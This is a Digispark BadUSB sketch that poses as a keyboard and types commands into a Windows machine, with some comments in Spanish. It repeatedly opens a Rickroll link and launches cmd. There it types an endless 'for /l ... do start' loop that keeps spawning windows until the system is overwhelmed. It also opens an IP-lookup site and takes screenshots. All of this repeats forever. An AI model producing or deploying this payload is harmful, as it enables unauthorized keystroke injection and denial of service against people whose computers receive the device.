#include "DigiKeyboard.h"

const char* screenshotFolder = "Home\\Screenshots";
const int delayShort = 300;
const int delayMedium = 600;
const int delayLong = 1000;

void setConsoleMode(int columns, int lines) {
  DigiKeyboard.print("MODE CON: COLS=" + String(columns) + " LINES=" + String(lines));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayShort);
}

void setConsoleColor(int backgroundColor, int textColor) {
  DigiKeyboard.print("COLOR " + String(backgroundColor) + String(textColor));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayMedium);
}

void startLoopCommand() {
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void openCmd() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void setupCmdWindow() {
  setConsoleMode(15, 1);
  setConsoleColor(1, 15);
  startLoopCommand();
}

void executeScript1() {
  openCmd();
  setupCmdWindow();
}

void openWebsiteAndCapture() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print("https://www.whatismyip.com/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayLong);
  DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // Para captura de pantalla completa
  DigiKeyboard.delay(delayLong);
}

void openFileExplorerAndNavigate() {
  DigiKeyboard.print("File Explorer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print(screenshotFolder);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void executeScript2() {
  openWebsiteAndCapture();
  openFileExplorerAndNavigate();
}

void setup() {
  // Vacío
}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Ejecutar el resto del programa original
  executeScript1();
  executeScript2();
}
